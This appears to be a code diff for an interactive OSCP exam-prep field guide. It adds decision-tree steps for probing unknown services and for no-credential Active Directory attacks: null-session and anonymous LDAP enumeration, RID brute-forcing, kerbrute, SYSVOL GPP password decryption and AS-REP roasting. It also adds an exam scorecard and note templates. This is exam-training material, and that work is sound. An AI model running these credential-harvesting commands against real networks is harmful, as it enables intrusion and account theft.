@@ -175,7 +175,7 @@ cd ~/results/$ip`,
     cmd: `# AD reference index`,
     warn: null,
     choices: [
-      { label: "AD entry — assumed breach", next: "ad_start" },
+      { label: "AD entry — assumed breach", next: "ad_nocreds" },
       { label: "BloodHound — run and read", next: "bloodhound" },
       { label: "Responder / LLMNR poisoning", next: "responder" },
       { label: "AS-REP roasting", next: "asrep_roast" },
@@ -279,7 +279,7 @@ grep -E "80|443|445|22|3389|5985|8080|1433|3306" mass_scan.txt`,
       { label: "Found web target", next: "web_enum" },
       { label: "Found SMB target", next: "smb_enum" },
       { label: "Found Windows (RDP/WinRM)", next: "windows_post_exploit" },
-      { label: "Found AD/DC", next: "ad_start" },
+      { label: "Found AD/DC", next: "ad_nocreds" },
       { label: "Single target — targeted scan", next: "targeted_scan" },
     ],
   },
@@ -543,7 +543,7 @@ sort -u pivot_hosts.txt > internal_live.txt`,
     warn: "Max --min-rate 200 through proxychains. Higher rates drop packets.",
     choices: [
       { label: "Found internal hosts — port scan them", next: "pivot_portscan" },
-      { label: "Found AD / DC", next: "ad_start" },
+      { label: "Found AD / DC", next: "ad_nocreds" },
       { label: "Found another subnet — double pivot", next: "double_pivot" },
     ],
   },
@@ -567,7 +567,7 @@ done`,
     choices: [
       { label: "Found internal web", next: "web_enum" },
       { label: "Found internal SMB", next: "smb_enum" },
-      { label: "Found internal AD / DC", next: "ad_start" },
+      { label: "Found internal AD / DC", next: "ad_nocreds" },
       { label: "Found another pivot layer", next: "double_pivot" },
       { label: "Full service enum", next: "targeted_scan" },
     ],
@@ -593,6 +593,84 @@ proxychains ssh -D 1081 user@172.16.50.X -N &`,
     choices: [
       { label: "Double pivot up — discover third network", next: "pivot_discovery" },
       { label: "Reached target — enumerate it", next: "targeted_scan" },
+    ],
+  },
+
+  research_unknown: {
+    phase: "RECON",
+    title: "Identify the Unknown Service",
+    body: "nmap couldn't identify the service. That's not a dead end — it's an invitation. Unknown ports are gifts: non-standard services are usually less hardened, and the path forward is already in what nmap already returned. The discipline is reading before reaching for more tools. The REMOTEMOUSE lesson: the banner 'luminateOK' on port 1978 was sitting in the nmap output. The hostname 'REMOTEMOUSE' was in the smb-os-discovery block. The entire intended path was already there — it just needed to be read.",
+    cmd: `# ── STEP 1: READ WHAT NMAP ALREADY GAVE YOU ──
+# Do this before running any new commands
+# Look for these in your existing scan output:
+
+# Banner strings on the unknown port:
+# 1978/tcp open  unrecognized
+# | fingerprint-strings:
+# |   NULL:
+# |     luminateOK       ← THIS IS YOUR ANSWER
+# |     system windows 6.2
+
+# Hostname from smb-os-discovery:
+# | smb-os-discovery:
+# |   Computer name: REMOTEMOUSE   ← THIS IS YOUR ANSWER
+
+# Version string nmap DID identify:
+# 1978/tcp open  luminate?   ← even a ? is data
+
+# PTR record / DNS name:
+# Nmap scan report for SERVICENAME.domain.local
+
+# ── STEP 2: MANUAL BANNER GRAB ────────────
+# If nmap didn't get a banner — grab it yourself
+nc -nv $ip <PORT>
+# Wait 5-10 seconds — some services respond to connection only
+
+# Try sending HTTP to it:
+curl -sv http://$ip:<PORT>
+curl -sv https://$ip:<PORT>
+
+# Try sending nothing and reading the response:
+echo "" | nc -nv $ip <PORT>
+
+# Try sending a newline:
+printf "\r\n" | nc -nv $ip <PORT>
+
+# ── STEP 3: GOOGLE THE EXACT BANNER STRING ─
+# Take the EXACT string from the banner and Google it in quotes
+# "luminateOK"           → Remote Mouse immediately
+# "220 ProFTPD"          → ProFTPD FTP server
+# "530 Password required" → FTP with auth
+# "elastic"              → Elasticsearch
+# Do NOT paraphrase — the exact string is a fingerprint
+
+# Also try:
+# port <NUMBER> service
+# port 1978 windows
+# "<banner string>" exploit
+# "<banner string>" vulnerability
+
+# ── STEP 4: SHODAN / CENSYS (if Google is slow) ──
+# Search Shodan for the port number to see what normally runs there:
+# https://www.shodan.io/search?query=port%3A1978
+# https://search.censys.io/
+
+# ── STEP 5: NMAP AGGRESSIVE PROBE ────────
+# Throw everything at it — scripts + version + intensity max
+nmap -p <PORT> -sC -sV --version-intensity 9 -A $ip
+
+# ── STEP 6: ONCE YOU HAVE A NAME — SEARCHSPLOIT ──
+searchsploit <service name>
+searchsploit <service name> <version>
+
+# Auto from nmap (if version now identified):
+searchsploit $(nmap -p <PORT> -sV $ip | grep open | awk '{print $3,$4}')`,
+    warn: "The hostname is enumeration. 'REMOTEMOUSE' in smb-os-discovery is not decoration — it is the box telling you what to attack. The banner string is a fingerprint. Google the exact string in quotes before you run any more tools. Unknown ports are the intended path more often than not — experienced testers get excited when nmap shows a question mark.",
+    choices: [
+      { label: "Banner identified — searchsploit it", next: "searchsploit_web" },
+      { label: "Identified as web service", next: "web_enum" },
+      { label: "Identified as known service", next: "unknown_service" },
+      { label: "Nothing — service completely opaque", next: "unknown_service" },
     ],
   },
 
@@ -2313,7 +2391,7 @@ curl -s http://$ip:5601/api/status`,
     choices: [
       { label: "Found credentials in indices", next: "creds_found" },
       { label: "Kibana accessible on 5601", next: "web_enum" },
-      { label: "Nothing useful — check other ports", next: "unknown_service" },
+      { label: "Nothing useful — check other ports", next: "research_unknown" },
     ],
   },
 
@@ -2684,7 +2762,7 @@ echo "stats" | nc -q 1 $ip 11211`,
     choices: [
       { label: "Found session tokens / creds in cache", next: "creds_found" },
       { label: "Found serialized objects — check for deserialization", next: "web_fuzz_deep" },
-      { label: "Nothing useful", next: "unknown_service" },
+      { label: "Nothing useful", next: "research_unknown" },
     ],
   },
 
@@ -2838,8 +2916,8 @@ searchsploit --nmap targeted.xml
       { label: "RDP (3389)", next: "rdp" },
       { label: "WinRM (5985 / 5986)", next: "winrm_access" },
       { label: "SNMP / DNS / LDAP / RPC", next: "other_services" },
-      { label: "Active Directory environment", next: "ad_start" },
-      { label: "Unknown service / unusual port", next: "unknown_service" },
+      { label: "Active Directory environment", next: "ad_nocreds" },
+      { label: "Unknown service / unusual port", next: "research_unknown" },
       { label: "Multiple internal subnets visible", next: "pivot_start" },
     ],
   },
@@ -2943,7 +3021,7 @@ cat scans/targeted.txt
     choices: [
       { label: "Web is highest value — enumerate it", next: "web_enum" },
       { label: "SMB first — shares may have credentials", next: "smb_enum" },
-      { label: "Unauthenticated DB/service — instant win", next: "unknown_service" },
+      { label: "Unauthenticated DB/service — instant win", next: "research_unknown" },
       { label: "FTP + web combination", next: "ftp_enum" },
       { label: "Back to full output analysis", next: "analyze_output" },
     ],
@@ -3093,7 +3171,7 @@ enum4linux-ng $ip
       { label: "No creds yet — AS-REP roast first", next: "asrep_roast" },
       { label: "Have creds — run BloodHound", next: "bloodhound" },
       { label: "Run Responder to capture hashes", next: "responder" },
-      { label: "Full AD methodology", next: "ad_start" },
+      { label: "Full AD methodology", next: "ad_nocreds" },
     ],
   },
 
@@ -4809,7 +4887,7 @@ showmount -e $ip`,
       { label: "Got usernames from SNMP/LDAP/RPC", next: "bruteforce" },
       { label: "SMTP open — enumerate users", next: "smtp_enum" },
       { label: "DNS — try zone transfer", next: "dns_enum" },
-      { label: "Domain info found — pivot to AD", next: "ad_start" },
+      { label: "Domain info found — pivot to AD", next: "ad_nocreds" },
       { label: "NFS share found — mount it", next: "nfs_enum" },
     ],
   },
@@ -6282,9 +6360,114 @@ type C:\\Users\\Administrator\\Desktop\\proof.txt
   // ══════════════════════════════════════════
   //  ACTIVE DIRECTORY
   // ══════════════════════════════════════════
+  ad_nocreds: {
+    phase: "AD",
+    title: "AD — No Creds Yet: Identify and Enumerate",
+    body: "You identified AD from the scan — ports 88 (Kerberos), 389 (LDAP), 445, 464, 3268 are the signature. Before you have any credentials the goal is: extract usernames, find null/anonymous access, hunt description fields for passwords, check SYSVOL/NETLOGON, and build a username list for kerbrute. Everything here is zero-auth or anonymous — no lockout risk. Add the domain and DC to /etc/hosts immediately. This is the S1REN first move: orient, then enumerate before touching anything authenticated.",
+    cmd: `# ── STEP 0: ORIENT — do this first ───────
+# Confirm it's AD (look for these in nmap output)
+# 88/tcp  open  kerberos-sec
+# 389/tcp open  ldap        → "Domain: domain.local"
+# 3268/tcp open ldap         → Global Catalog
+# 445/tcp open  microsoft-ds
+
+# Extract domain name from nmap output:
+# "LDAP (Domain: corp.local0., Site: Default-First-Site-Name)"
+# Strip trailing 0. → corp.local
+
+export DOMAIN=corp.local
+export DC_IP=$ip
+# Add to /etc/hosts — mandatory, Kerberos needs name resolution
+echo "$DC_IP dc01.$DOMAIN $DOMAIN" >> /etc/hosts
+
+# ── STEP 1: SMB NULL / GUEST SESSION ─────
+# Try before anything else — often gives you users, shares, policy
+crackmapexec smb $DC_IP -u '' -p ''
+crackmapexec smb $DC_IP -u 'guest' -p ''
+# If [+] — you have anonymous/guest access
+# Enumerate what you can get:
+crackmapexec smb $DC_IP -u '' -p '' --shares
+crackmapexec smb $DC_IP -u '' -p '' --users
+crackmapexec smb $DC_IP -u '' -p '' --pass-pol
+
+# enum4linux-ng — full null session dump
+enum4linux-ng -A $DC_IP
+# Look for: users, groups, password policy, shares, OS info
+# Pipe to file — output is long:
+enum4linux-ng -A $DC_IP | tee enum4linux_out.txt
+
+# ── STEP 2: LDAP ANONYMOUS ───────────────
+# LDAP often allows anonymous binds — yields full user/group lists
+ldapsearch -x -H ldap://$DC_IP -b "dc=$(echo $DOMAIN | sed 's/\./,dc=/g')" -s sub "(objectClass=user)" sAMAccountName description memberOf 2>/dev/null | grep -E "sAMAccountName:|description:|memberOf:"
+
+# Full anonymous dump:
+ldapsearch -x -H ldap://$DC_IP -b "dc=$(echo $DOMAIN | sed 's/\./,dc=/g')" > ldap_anon.txt
+# Hunt for passwords in description fields:
+grep -i "description:" ldap_anon.txt | grep -iv "built-in\|default"
+
+# ── STEP 3: RID BRUTE — enumerate users ──
+# Works when null sessions are restricted — brute forces RIDs
+# Low noise, no lockout risk
+crackmapexec smb $DC_IP -u '' -p '' --rid-brute
+crackmapexec smb $DC_IP -u 'guest' -p '' --rid-brute
+# impacket — same technique:
+impacket-lookupsid $DOMAIN/guest@$DC_IP -no-pass 2>/dev/null | grep "SidTypeUser" | awk -F'\\ ' '{print $2}' | awk '{print $1}' > users.txt
+
+# ── STEP 4: KERBRUTE — valid username enum ─
+# Uses AS-REQ probes — no authentication, no lockout
+# Requires a username wordlist (SecLists or built from OSINT)
+./kerbrute_linux_amd64 userenum \
+  -d $DOMAIN --dc $DC_IP \
+  /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt \
+  -o kerbrute_valid.txt --downcase
+# --downcase normalises to lowercase — AD names are case-insensitive
+
+# Faster — just common names wordlist first:
+./kerbrute_linux_amd64 userenum \
+  -d $DOMAIN --dc $DC_IP \
+  /usr/share/seclists/Usernames/Names/names.txt \
+  -o kerbrute_valid.txt
+
+# ── STEP 5: SYSVOL / NETLOGON HUNTING ────
+# SYSVOL is world-readable — always check
+smbclient //$DC_IP/SYSVOL -U '' -N
+smbclient //$DC_IP/SYSVOL -N -c "ls"
+# Spider it recursively for scripts, configs, Group Policy:
+crackmapexec smb $DC_IP -u '' -p '' -M spider_plus
+# Look for: Groups.xml (GPP passwords), scripts with hardcoded creds
+# Groups.xml → decrypt cpassword:
+gpp-decrypt 'CPASSWORD_VALUE_HERE'
+
+# Manually grab Groups.xml if found:
+smbclient //$DC_IP/SYSVOL -N -c "get Policies/{GUID}/Machine/Preferences/Groups/Groups.xml"
+
+# ── STEP 6: DESCRIPTION FIELD SWEEP ──────
+# Passwords in description fields is one of the most common
+# AD misconfigurations — check every time
+crackmapexec smb $DC_IP -u '' -p '' --users 2>/dev/null | grep -i "badpwdcount\|description"
+ldapsearch -x -H ldap://$DC_IP -b "dc=$(echo $DOMAIN | sed 's/\./,dc=/g')" "(objectClass=user)" description | grep -i "description:" | grep -v "^#"
+
+# ── STEP 7: AS-REP ROAST — no creds needed ─
+# If you have a username list — try without authentication
+impacket-GetNPUsers $DOMAIN/ \
+  -usersfile users.txt \
+  -dc-ip $DC_IP \
+  -request -outputfile asrep_noauth.kerb -no-pass
+# Any result → hash to crack offline`,
+    warn: "The description field is the most commonly overlooked no-creds finding — check it on every AD box. SYSVOL is world-readable by default and GPP passwords (Groups.xml) are still found on real exams. RID bruting with crackmapexec almost always works even when null sessions appear blocked — try it before moving on. Kerbrute uses AS-REQ probes not authentication — zero lockout risk, but it does generate Kerberos traffic.",
+    choices: [
+      { label: "Got null/guest session — users and shares found", next: "ad_start" },
+      { label: "Description field had a password", next: "ad_start" },
+      { label: "GPP password found in SYSVOL", next: "ad_start" },
+      { label: "AS-REP roast hit — no creds needed", next: "asrep_roast" },
+      { label: "Have username list — try AS-REP roast", next: "asrep_roast" },
+      { label: "Nothing anonymous — given creds (assumed breach)", next: "ad_start" },
+    ],
+  },
+
   ad_start: {
     phase: "AD",
-    title: "Active Directory — Initial Enumeration",
+    title: "Active Directory — Enumeration with Creds",
     body: "OSCP AD sets give you low-priv domain creds and a foothold. The first 15 minutes are critical: verify your creds work, map the domain structure, check the password policy before touching anything noisy. BloodHound runs in the background while you do manual enumeration. Everything in AD is about finding a path from your current account to Domain Admin — BloodHound shows you paths, manual enum finds what BloodHound misses.",
     cmd: `# ── STEP 0: ORIENT ───────────────────────
 # Add DC to /etc/hosts (replace with real values)
@@ -7496,6 +7679,45 @@ export default function OSCPAdventure() {
   const [copied, setCopied] = useState(false);
   const [animKey, setAnimKey] = useState(0);
   const [showAbout, setShowAbout] = useState(false);
+  const [showReport, setShowReport] = useState(false);
+
+  // ── EXAM SCORECARD STATE ──────────────────────────────────────────────
+  const initMachine = (name) => ({ name, local: false, proof: false, notes: "" });
+  const [machines, setMachines] = React.useState({
+    ad1:  initMachine("AD Machine 1"),
+    ad2:  initMachine("AD Machine 2"),
+    adc:  initMachine("AD Domain Controller"),
+    sa1:  initMachine("Standalone 1"),
+    sa2:  initMachine("Standalone 2"),
+    sa3:  initMachine("Standalone 3"),
+  });
+  const [metasploitUsed, setMetasploitUsed] = React.useState("");
+  const [osid, setOsid] = React.useState("");
+  const [examNotes, setExamNotes] = React.useState("");
+
+  const toggleFlag = (machineKey, flag) => {
+    setMachines(prev => ({
+      ...prev,
+      [machineKey]: { ...prev[machineKey], [flag]: !prev[machineKey][flag] }
+    }));
+  };
+
+  const calcScore = () => {
+    let score = 0;
+    const { ad1, ad2, adc, sa1, sa2, sa3 } = machines;
+    // AD: only scores if DC is fully owned
+    if (adc.proof) {
+      if (ad1.local) score += 10;
+      if (ad2.local) score += 10;
+      score += 20; // DC proof
+    }
+    // Standalones: partial points allowed
+    [sa1, sa2, sa3].forEach(m => {
+      if (m.local) score += 10;
+      if (m.proof) score += 10;
+    });
+    return score;
+  };
   const topRef = useRef(null);
 
   const currentId = history[history.length - 1];
@@ -7532,11 +7754,37 @@ export default function OSCPAdventure() {
 
   const copyObsidian = () => {
     const lines = [];
-    lines.push(`# ${node.title}`);
-    lines.push(`**Phase:** ${node.phase}  `);
-    lines.push(`**Date:** ${new Date().toISOString().slice(0,10)}  `);
-    lines.push(`**Node:** \`${currentId}\``);
+    const now = new Date();
+    const ts = now.toISOString().slice(0,10) + ' ' + now.toTimeString().slice(0,5);
+
+    // ── YAML FRONTMATTER ─────────────────────
+    lines.push('---');
+    lines.push(`title: "${node.title}"`);
+    lines.push(`phase: ${node.phase}`);
+    lines.push(`node: ${currentId}`);
+    lines.push(`date: ${ts}`);
+    lines.push(`ip: ""`);
+    lines.push(`status: in-progress`);
+    // Auto-tag by phase
+    const phaseTagMap = {
+      RECON: ['recon','enum'], WEB: ['web','enum'], SHELL: ['shell','initial-access'],
+      WINDOWS: ['windows','privesc'], LINUX: ['linux','privesc'], AD: ['ad','domain'],
+      SMB: ['smb','enum'], PIVOT: ['pivot','tunnel'], CREDS: ['creds','loot'],
+      FTP: ['ftp','enum'], SSH: ['ssh','enum'], ANALYSIS: ['analysis'],
+      DISCOVERY: ['discovery','recon'], MINDSET: ['mindset'],
+      REPORT: ['report'], JUMP: ['reference']
+    };
+    const tags = phaseTagMap[node.phase] || ['oscp'];
+    lines.push(`tags: [${tags.map(t => `"${t}"`).join(', ')}]`);
+    lines.push('---');
     lines.push('');
+
+    // ── HEADER ────────────────────────────────
+    lines.push(`# ${node.title}`);
+    lines.push(`> **${node.phase}** · \`${currentId}\` · ${ts}`);
+    lines.push('');
+
+    // ── GUIDANCE + WARN ───────────────────────
     lines.push('## Guidance');
     lines.push(node.body);
     lines.push('');
@@ -7545,6 +7793,8 @@ export default function OSCPAdventure() {
       lines.push(`> ${node.warn}`);
       lines.push('');
     }
+
+    // ── COMMANDS ──────────────────────────────
     if (node.cmd) {
       lines.push('## Commands');
       lines.push('```bash');
@@ -7552,25 +7802,216 @@ export default function OSCPAdventure() {
       lines.push('```');
       lines.push('');
     }
-    lines.push('## What I Found');
-    lines.push('');
-    lines.push('```');
-    lines.push('');
-    lines.push('```');
-    lines.push('');
-    lines.push('## Proof / Evidence');
-    lines.push('');
-    lines.push('- Screenshot: ');
-    lines.push('- Output: ');
-    lines.push('');
+
+    // ── PHASE-SPECIFIC LIVE NOTE BLOCKS ───────
+    const phase = node.phase;
+
+    if (phase === 'RECON' || phase === 'DISCOVERY') {
+      lines.push('## Target');
+      lines.push('| Field | Value |');
+      lines.push('|-------|-------|');
+      lines.push('| IP | |');
+      lines.push('| Hostname | |');
+      lines.push('| OS | |');
+      lines.push('');
+      lines.push('## Ports Found');
+      lines.push('| Port | Service | Version | Notes |');
+      lines.push('|------|---------|---------|-------|');
+      lines.push('| | | | |');
+      lines.push('');
+      lines.push('## Searchsploit Hits');
+      lines.push('```');
+      lines.push('# searchsploit --nmap targeted.xml output here');
+      lines.push('```');
+      lines.push('');
+    }
+
+    else if (phase === 'WEB') {
+      lines.push('## Web Target');
+      lines.push('| Field | Value |');
+      lines.push('|-------|-------|');
+      lines.push('| URL | |');
+      lines.push('| Tech Stack | |');
+      lines.push('| App / Version | |');
+      lines.push('| Login Page | |');
+      lines.push('');
+      lines.push('## Directories Found');
+      lines.push('```');
+      lines.push('');
+      lines.push('```');
+      lines.push('');
+      lines.push('## Credentials Tried');
+      lines.push('| Username | Password | Result |');
+      lines.push('|----------|----------|--------|');
+      lines.push('| | | |');
+      lines.push('');
+    }
+
+    else if (phase === 'SMB' || phase === 'FTP' || phase === 'SSH') {
+      lines.push('## Service Details');
+      lines.push('| Field | Value |');
+      lines.push('|-------|-------|');
+      lines.push('| Version | |');
+      lines.push('| Null/Anon session | Y / N |');
+      lines.push('| Searchsploit hit | |');
+      lines.push('');
+      lines.push('## Shares / Files Found');
+      lines.push('```');
+      lines.push('');
+      lines.push('```');
+      lines.push('');
+      lines.push('## Credentials Tried');
+      lines.push('| Username | Password | Result |');
+      lines.push('|----------|----------|--------|');
+      lines.push('| | | |');
+      lines.push('');
+    }
+
+    else if (phase === 'SHELL') {
+      lines.push('## Shell Details');
+      lines.push('| Field | Value |');
+      lines.push('|-------|-------|');
+      lines.push('| Payload used | |');
+      lines.push('| Delivery method | |');
+      lines.push('| LHOST | |');
+      lines.push('| LPORT | |');
+      lines.push('| Shell type caught | |');
+      lines.push('| Stabilized | Y / N |');
+      lines.push('');
+      lines.push('## Shell Output');
+      lines.push('```');
+      lines.push('');
+      lines.push('```');
+      lines.push('');
+    }
+
+    else if (phase === 'LINUX') {
+      lines.push('## Foothold');
+      lines.push('| Field | Value |');
+      lines.push('|-------|-------|');
+      lines.push('| User | |');
+      lines.push('| Shell | |');
+      lines.push('| Privesc vector | |');
+      lines.push('');
+      lines.push('## Key Findings');
+      lines.push('```bash');
+      lines.push('# whoami && id && hostname && ip a');
+      lines.push('');
+      lines.push('```');
+      lines.push('');
+      lines.push('> [!important] Proof Capture');
+      lines.push('> `cat /root/proof.txt` + `ip addr` in same screenshot');
+      lines.push('> Must be interactive shell — not webshell');
+      lines.push('');
+      lines.push('## proof.txt');
+      lines.push('```');
+      lines.push('');
+      lines.push('```');
+      lines.push('');
+    }
+
+    else if (phase === 'WINDOWS') {
+      lines.push('## Foothold');
+      lines.push('| Field | Value |');
+      lines.push('|-------|-------|');
+      lines.push('| User | |');
+      lines.push('| Integrity | Medium / High / SYSTEM |');
+      lines.push('| OS / Build | |');
+      lines.push('| Privesc vector | |');
+      lines.push('');
+      lines.push('## Key Findings');
+      lines.push('```');
+      lines.push('# whoami /priv output');
+      lines.push('');
+      lines.push('```');
+      lines.push('');
+      lines.push('> [!important] Proof Capture');
+      lines.push('> `type proof.txt` + `ipconfig` in same screenshot');
+      lines.push('> Must be SYSTEM or Administrator — interactive shell');
+      lines.push('');
+      lines.push('## proof.txt');
+      lines.push('```');
+      lines.push('');
+      lines.push('```');
+      lines.push('');
+    }
+
+    else if (phase === 'AD') {
+      lines.push('## Domain Details');
+      lines.push('| Field | Value |');
+      lines.push('|-------|-------|');
+      lines.push('| Domain | |');
+      lines.push('| DC IP | |');
+      lines.push('| Current User | |');
+      lines.push('| BloodHound path | |');
+      lines.push('');
+      lines.push('## Users / Groups Found');
+      lines.push('```');
+      lines.push('');
+      lines.push('```');
+      lines.push('');
+      lines.push('## Credentials');
+      lines.push('| User | Password / Hash | Source |');
+      lines.push('|------|-----------------|--------|');
+      lines.push('| | | |');
+      lines.push('');
+    }
+
+    else if (phase === 'PIVOT') {
+      lines.push('## Tunnel Details');
+      lines.push('| Field | Value |');
+      lines.push('|-------|-------|');
+      lines.push('| Pivot host | |');
+      lines.push('| Internal subnet | |');
+      lines.push('| Tunnel type | |');
+      lines.push('| Route added | |');
+      lines.push('');
+      lines.push('## Internal Hosts Found');
+      lines.push('| IP | Ports | Notes |');
+      lines.push('|----|-------|-------|');
+      lines.push('| | | |');
+      lines.push('');
+    }
+
+    else if (phase === 'CREDS') {
+      lines.push('## Credentials Log');
+      lines.push('| Username | Password | Hash | Service | Source |');
+      lines.push('|----------|----------|------|---------|--------|');
+      lines.push('| | | | | |');
+      lines.push('');
+      lines.push('## Cracked Hashes');
+      lines.push('```');
+      lines.push('');
+      lines.push('```');
+      lines.push('');
+    }
+
+    else {
+      // Generic fallback for ANALYSIS, MINDSET, JUMP, REPORT
+      lines.push('## What I Found');
+      lines.push('```');
+      lines.push('');
+      lines.push('```');
+      lines.push('');
+    }
+
+    // ── NEXT MOVE (all phases) ─────────────────
     lines.push('## Next Move');
     lines.push('');
     node.choices.forEach(c => {
       lines.push(`- [ ] ${c.label} → \`${c.next}\``);
     });
     lines.push('');
+
+    // ── PATH BREADCRUMB ───────────────────────
+    if (history && history.length > 0) {
+      lines.push('## Path Taken');
+      lines.push('`' + [...history, currentId].join(' → ') + '`');
+      lines.push('');
+    }
+
     lines.push('---');
-    lines.push('*Generated by The Path — OSCP Field Guide*');
+    lines.push('*The Path — OSCP Field Guide*');
     navigator.clipboard.writeText(lines.join('\n'));
     setCopiedMd(true);
     setTimeout(() => setCopiedMd(false), 1800);
@@ -7581,6 +8022,7 @@ export default function OSCPAdventure() {
   useEffect(() => {
     const handleKey = (e) => {
       if (showAbout) { if (e.key === "Escape") setShowAbout(false); return; }
+      if (showReport) { if (e.key === "Escape") setShowReport(false); return; }
       if (e.target.tagName === "INPUT" || e.target.tagName === "TEXTAREA") return;
       const num = parseInt(e.key);
       if (!isNaN(num) && num >= 1 && num <= node.choices.length) {
@@ -7589,6 +8031,7 @@ export default function OSCPAdventure() {
       if (e.key === "Backspace" || e.key === "ArrowLeft") back();
       if (e.key === "r" || e.key === "R") reset();
       if (e.key === "?" || e.key === "a" || e.key === "A") setShowAbout(true);
+      if (e.key === "e" || e.key === "E") setShowReport(true);
     };
     window.addEventListener("keydown", handleKey);
     return () => window.removeEventListener("keydown", handleKey);
@@ -7704,6 +8147,24 @@ export default function OSCPAdventure() {
             onMouseEnter={e => e.currentTarget.style.borderColor = "#3a4858"}
             onMouseLeave={e => e.currentTarget.style.borderColor = "#1e2838"}
           >? about</button>
+          <button
+            onClick={() => setShowReport(true)}
+            style={{
+              background: "transparent",
+              border: "1px solid #e53e3e44",
+              color: "#e53e3e",
+              padding: "5px 12px",
+              cursor: "pointer",
+              fontFamily: "inherit",
+              fontSize: 15,
+              letterSpacing: 2,
+              borderRadius: 2,
+              textTransform: "uppercase",
+              transition: "all 0.2s",
+            }}
+            onMouseEnter={e => e.currentTarget.style.borderColor = "#e53e3e99"}
+            onMouseLeave={e => e.currentTarget.style.borderColor = "#e53e3e44"}
+          >⬡ exam</button>
           <button
             onClick={back}
             disabled={history.length <= 1}
@@ -8050,6 +8511,341 @@ export default function OSCPAdventure() {
           ))}
         </div>
       </main>
+
+      {/* ── EXAM REPORT MODAL ───────────────────── */}
+      {showReport && (
+        <div
+          onClick={() => setShowReport(false)}
+          style={{
+            position: "fixed",
+            inset: 0,
+            background: "rgba(0,0,0,0.92)",
+            zIndex: 100,
+            display: "flex",
+            alignItems: "flex-start",
+            justifyContent: "center",
+            padding: "24px 16px",
+            overflowY: "auto",
+          }}
+        >
+          <div
+            onClick={e => e.stopPropagation()}
+            style={{
+              background: "#0c1018",
+              border: "1px solid #e53e3e33",
+              borderRadius: 8,
+              padding: "32px 36px",
+              maxWidth: 720,
+              width: "100%",
+              fontFamily: "inherit",
+              boxShadow: "0 0 80px #e53e3e11",
+              marginBottom: 24,
+            }}
+          >
+            {/* Header */}
+            <div style={{ display: "flex", justifyContent: "space-between", alignItems: "flex-start", marginBottom: 28 }}>
+              <div>
+                <div style={{ fontSize: 20, fontWeight: 800, letterSpacing: 4, color: "#e53e3e", textTransform: "uppercase" }}>
+                  Exam Scorecard
+                </div>
+                <div style={{ fontSize: 11, letterSpacing: 3, color: "#3a4858", textTransform: "uppercase", marginTop: 4 }}>
+                  OSCP+ · 70pts to pass · 23:45 exam · 24hr report window
+                </div>
+              </div>
+              <div style={{ textAlign: "right" }}>
+                <div style={{ fontSize: 36, fontWeight: 900, color: calcScore() >= 70 ? "#7ecb9e" : calcScore() >= 50 ? "#f6ad55" : "#e53e3e", letterSpacing: 2 }}>
+                  {calcScore()}
+                </div>
+                <div style={{ fontSize: 11, letterSpacing: 2, color: "#3a4858", textTransform: "uppercase" }}>/ 100 pts</div>
+              </div>
+            </div>
+
+            {/* OSID */}
+            <div style={{ marginBottom: 24 }}>
+              <div style={{ fontSize: 11, letterSpacing: 3, color: "#3a4858", textTransform: "uppercase", marginBottom: 6 }}>Your OSID</div>
+              <input
+                value={osid}
+                onChange={e => setOsid(e.target.value)}
+                placeholder="OS-XXXXX"
+                style={{
+                  background: "#060a0e", border: "1px solid #1e2838", color: "#cdd6e0",
+                  padding: "6px 12px", fontFamily: "inherit", fontSize: 14, borderRadius: 2,
+                  width: 160, letterSpacing: 2,
+                }}
+              />
+              {osid && (
+                <div style={{ fontSize: 11, color: "#3a4858", marginTop: 6, letterSpacing: 1 }}>
+                  Report filename: <span style={{ color: "#7ecb9e" }}>OSCP-{osid}-Exam-Report.pdf</span>
+                  {" → "}<span style={{ color: "#7ecb9e" }}>OSCP-{osid}-Exam-Report.7z</span>
+                </div>
+              )}
+            </div>
+
+            {/* Score breakdown */}
+            <div style={{ marginBottom: 28 }}>
+              <div style={{ fontSize: 11, letterSpacing: 3, color: "#3a4858", textTransform: "uppercase", marginBottom: 12 }}>
+                Score Tracker
+              </div>
+
+              {/* AD Section */}
+              <div style={{ background: "#060a0e", border: "1px solid #1e2838", borderRadius: 4, padding: "16px", marginBottom: 8 }}>
+                <div style={{ fontSize: 11, letterSpacing: 3, color: "#7c3aed", textTransform: "uppercase", marginBottom: 10 }}>
+                  Active Directory Set — 40pts total
+                </div>
+                <div style={{ fontSize: 10, color: "#3a4858", marginBottom: 10, letterSpacing: 1 }}>
+                  ⚠ AD only scores if DC is fully compromised — no partial AD points
+                </div>
+                {["ad1","ad2","adc"].map(key => {
+                  const m = machines[key];
+                  const isdc = key === "adc";
+                  return (
+                    <div key={key} style={{ display: "flex", alignItems: "center", gap: 10, marginBottom: 8, padding: "6px 0", borderBottom: "1px solid #0e1420" }}>
+                      <div style={{ width: 160, fontSize: 13, color: "#8899aa" }}>{m.name}</div>
+                      {!isdc ? (
+                        <label style={{ display: "flex", alignItems: "center", gap: 5, cursor: "pointer", fontSize: 12, color: machines[key].local ? "#7ecb9e" : "#3a4858" }}>
+                          <input type="checkbox" checked={m.local} onChange={() => toggleFlag(key, "local")}
+                            style={{ accentColor: "#7ecb9e" }} />
+                          local.txt +10
+                        </label>
+                      ) : (
+                        <label style={{ display: "flex", alignItems: "center", gap: 5, cursor: "pointer", fontSize: 12, color: machines[key].proof ? "#7ecb9e" : "#3a4858" }}>
+                          <input type="checkbox" checked={m.proof} onChange={() => toggleFlag(key, "proof")}
+                            style={{ accentColor: "#7ecb9e" }} />
+                          proof.txt +20
+                        </label>
+                      )}
+                    </div>
+                  );
+                })}
+              </div>
+
+              {/* Standalone machines */}
+              <div style={{ background: "#060a0e", border: "1px solid #1e2838", borderRadius: 4, padding: "16px" }}>
+                <div style={{ fontSize: 11, letterSpacing: 3, color: "#3b9eff", textTransform: "uppercase", marginBottom: 10 }}>
+                  Standalone Machines — 60pts total
+                </div>
+                {["sa1","sa2","sa3"].map(key => {
+                  const m = machines[key];
+                  return (
+                    <div key={key} style={{ display: "flex", alignItems: "center", gap: 10, marginBottom: 8, padding: "6px 0", borderBottom: "1px solid #0e1420" }}>
+                      <div style={{ width: 160, fontSize: 13, color: "#8899aa" }}>{m.name}</div>
+                      <label style={{ display: "flex", alignItems: "center", gap: 5, cursor: "pointer", fontSize: 12, color: m.local ? "#7ecb9e" : "#3a4858" }}>
+                        <input type="checkbox" checked={m.local} onChange={() => toggleFlag(key, "local")}
+                          style={{ accentColor: "#7ecb9e" }} />
+                        local.txt +10
+                      </label>
+                      <label style={{ display: "flex", alignItems: "center", gap: 5, cursor: "pointer", fontSize: 12, color: m.proof ? "#7ecb9e" : "#3a4858" }}>
